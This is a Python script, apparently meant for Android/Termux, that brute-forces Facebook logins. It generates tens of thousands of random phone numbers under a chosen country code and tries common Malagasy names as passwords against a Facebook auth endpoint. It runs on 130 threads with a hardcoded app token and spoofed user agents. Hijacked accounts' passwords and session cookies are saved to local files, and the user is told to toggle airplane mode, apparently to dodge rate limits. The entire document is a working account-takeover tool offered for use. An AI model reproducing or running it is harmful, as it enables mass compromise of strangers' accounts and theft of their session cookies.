# -*- coding: utf-8 -*-
# Update by: MKING
# Script Owner: Mohammad Sultani

try:
    import os, requests, time, re, random, sys, uuid, string, json, subprocess, base64, zlib, hashlib
    from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
    os.system('pip install requests > /dev/null')
    import requests
    


# MKING-LOGO
logo = '''
                          SCRIPT BY MASTER JANI                                             
\033[1;97m--------------------------------------------------
\033[1;91m Author     : MR JANI
\033[1;91m GitHub    : MASTER_X_BROWN 
\033[1;91m Status     : PERSONNAL
\033[1;97m--------------------------------------------------
'''

loop = 0
oks = []
pcp = []
cps = []

# MKING-MENU
def menu():
    os.system('clear')
    print(logo)
    print('[1] Random Crack ')
    print('[0] Exit Menu')
    print(47 * '-')
    opt = input('[?] Choose : ')
    if opt == '1':
        mg_randome()
    elif opt == '0':
        sys.exit()
    else:
        print('\033[1;91m [•] Choose valid option\033[0;97m')
        menu()
# MKING-RANDOM_CRACK
def mg_randome():
    user = []
    os.system('clear')
    print(logo)
    print('[+] For MG (+26133,+26134,+26132)ETC....')
    print(47 * '-')
    kode = input('[?] Input Code : ')
    print(47 * '-')
    limit = int('80000')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with tred(max_workers=130) as bnb:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('[+] Total Ids : \033[1;92m' + tl)
        print('\033[1;37;1m[$] Brute Has been started...(\033[1;92mUPDATE RANDOME \033[1;97m)')
        print(47 * '-')
        print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE')
        print(47 * '-')
        for psx in user:
            ids = kode + psx
            passlist = [psx,ids,'rakoto','malala','malalako','vadiko','faniry','tahina','rakoto','fitiavana','Malagasy','sitraka','razafy','anjara','sarobidy','vahatra','lahatra','fandresena','salama','nantenaina','Nomena','niaina','Hasina','Ravaka','tsiory','Felana','valisoa','Tatiana','Gasikara','tsiresy','faneva','tiavina','fanomezana','Fanomezantsoa','sahaza','avaratra','avotra','tafita','Mamako','Zanako','jesosy','Niaina','finoana','Fiderana','Nomentsoa','Mirana','Faratiana','fitahiana','Mahery','lataka','Mamisoa','valisoa','mihary','finona','Larissa','Lahatra']
            bnb.submit(rndm, ids, passlist)
    print(47 * '\n\033[1;37m-')
    print('[√] Crack process has been completed')
    print('[?] Total Ok Id Save in  /sdcard/MKING-OK.txt')
    print('[?] Total Cp Id Save in  /sdcard/MKING-CP.txt')
    print(47 * '-')
    input(' Press Enter To Back Menu')
    menu()

# START-CRACK
def rndm(ids, master_pass):
    global oks, loop
    sys.stdout.write('\r\r\033[1;37m [STEVE-CRACK] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
    try:
        for pas in master_pass:
            fbav = f'{random.randint(111, 999)}.0.0.{random.randint(11, 99)}.{random.randint(111, 999)}'
            fbbv = str(random.randint(111111111, 999999999))
            android_version = subprocess.check_output('getprop ro.build.version.release', shell=True).decode('utf-8').strip()
            model = subprocess.check_output('getprop ro.product.model', shell=True).decode('utf-8').strip()
            build = subprocess.check_output('getprop ro.build.id', shell=True).decode('utf-8').strip()
            fbmf = subprocess.check_output('getprop ro.product.manufacturer', shell=True).decode('utf-8').strip()
            fbbd = subprocess.check_output('getprop ro.product.brand', shell=True).decode('utf-8').strip()
            ua = f'Dalvik/2.1.0 (Linux; U; Android {android_version}; {model} Build/{build}) [FBAN/Mbasic-Android;FBAV/{fbav};FBBV/{fbbv};FBRV/0;FBPN/com.facebook.mbasic;FBLC/en_US;FBMF/{fbmf};FBBD/{fbbd};FBDV/{model};FBSV/{android_version};FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{{density={random.randint(1, 9)}.{random.randint(1, 9)},width={random.randint(500, 999)},height={random.randint(999, 1999)}}};FB_FW/1;]'
            data = {
                "locale": "en_GB",
                "format": "json",
                "email": ids,
                "password": pas,
                "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                "generate_session_cookies": 1
            }
            headers = {
                'user-agent': ua,
                'Host': 'b-graph.facebook.com',
                'Content-Type': 'application/json;charset=utf-8',
                'Connection': 'Keep-Alive',
                'Accept-Encoding': 'gzip'
            }
            response = requests.post("https://mbasic.facebook.com/auth/login", data=data, headers=headers).json()
            if 'session_key' in response:
                uid = response.get('uid', '')
                if uid:  # Ensure uid is present
                    coki = ';'.join(i['name'] + '=' + i['value'] for i in response['session_cookies'])
                    print('\r\r\033[1;32m [STEVE-OK❤️] ' + str(uid) + ' | ' + pas + '\033[1;97m')
                    print('\r\r\033[1;32m [COOKIES] %s   ' % (coki))
                    with open('/sdcard/Steve-COKIE.txt', 'a') as f:
                        f.write(f'{uid}|{pas}|{coki}\n')
                    oks.append(uid)
                    break
            elif 'mbasic.facebook.com' in response.get('error', {}).get('message', ''):
                uid = response['error']['error_data'].get('uid', '')
                if uid:  # Ensure uid is present
                    print('\r\r\x1b[1;33m [STEVE-CP💔] ' + str(uid) + ' | ' + pas + '\033[1;97m')
                    with open('/sdcard/MKING-CP.txt', 'a') as f:
                        f.write(f'{uid}|{pas}\n')
                    cps.append(uid)
                    break
        loop += 1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
      #  print(f'Error: {e}')
        pass
menu()
